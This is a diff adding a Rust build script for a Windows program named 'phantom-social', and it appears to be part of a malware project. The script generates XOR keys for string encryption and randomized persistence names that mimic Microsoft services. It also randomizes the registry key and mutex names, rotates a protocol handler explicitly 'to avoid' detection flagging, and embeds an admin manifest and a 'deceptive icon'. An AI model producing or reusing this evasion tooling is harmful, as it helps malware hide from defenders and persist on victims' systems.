@@ -1,0 +1,88 @@
+﻿use std::env;
+use std::fs::File;
+use std::io::Write;
+use std::path::Path;
+
+fn main() {
+    let out_dir = env::var("OUT_DIR").unwrap();
+    let dest_path = Path::new(&out_dir).join("generated.rs");
+    let mut f = File::create(&dest_path).unwrap();
+
+    // Generate random XOR keys for string encryption
+    let xor_keys: Vec<String> = (0..16)
+        .map(|_| format!("0x{:02X}", rand::random::<u8>()))
+        .collect();
+
+    // Generate random persistence registry entry name
+    let prefixes = ["Windows", "Microsoft", "System", "Security", "Update"];
+    let suffixes = ["Service", "Monitor", "Health", "Manager", "Helper", "Assistant"];
+    let persist_name = format!(
+        "{}{}{}",
+        prefixes[rand::random::<usize>() % prefixes.len()],
+        suffixes[rand::random::<usize>() % suffixes.len()],
+        rand::random::<u16>() % 1000
+    );
+
+    // Generate random session prefix
+    let session_prefix = format!("MS{:X}", rand::random::<u32>());
+
+    // 1. ROTATE PROTOCOL HANDLER
+    // Generates a random protocol like "ms-action-3A1B" to avoid "msaccount" flagging
+    let protocol_scheme = format!("ms-action-{:x}", rand::random::<u16>());
+
+    // 2. RANDOMIZE REGISTRY KEY
+    // Removed \0 because CString::new() in main.rs adds it automatically
+    let verify_reg_key = format!(
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Auth_{:x}", 
+        rand::random::<u32>()
+    );
+
+    // 3. RANDOMIZE MUTEX
+    // Removed \0 because CString::new() in main.rs adds it automatically
+    let mutex_name = format!(
+        "Global\\WinSession_{:x}_Lock", 
+        rand::random::<u32>()
+    );
+
+    // Write generated constants
+    // FIX: Used r"{}" (raw strings) for VERIFY_REG_KEY and MUTEX_NAME to handle backslashes
+    write!(
+        f,
+        "// Auto-generated - DO NOT EDIT\n\
+const XOR_KEYS: [u8; 16] = [{}];\n\
+const PERSIST_NAME: &str = \"{}\";\n\
+const SESSION_PREFIX: &str = \"{}\";\n\
+const PROTOCOL_SCHEME: &str = \"{}\";\n\
+const VERIFY_REG_KEY: &str = r\"{}\";\n\
+const MUTEX_NAME: &str = r\"{}\";\n",
+        xor_keys.join(", "),
+        persist_name,
+        session_prefix,
+        protocol_scheme,
+        verify_reg_key,
+        mutex_name
+    )
+    .unwrap();
+
+    println!("cargo:rerun-if-changed=build.rs");
+
+    // Embed the Windows manifest (Administrator/Invoker permissions)
+    if cfg!(target_os = "windows") {
+        embed_manifest::embed_manifest_file("phantom-social.exe.manifest")
+            .expect("Failed to embed manifest");
+            
+        println!("cargo:rerun-if-changed=phantom-social.exe.manifest");
+    }
+
+    // Embed the Deceptive Icon (Visible in File Explorer)
+    // This requires 'icon.ico' to be present in the project root
+    if cfg!(target_os = "windows") {
+        let mut res = winres::WindowsResource::new();
+        // This sets the icon for the .exe file itself
+        res.set_icon("icon.ico");
+        res.compile().expect("Failed to compile winres (missing icon.ico?)");
+        
+        println!("cargo:rerun-if-changed=icon.ico");
+    }
+}
+
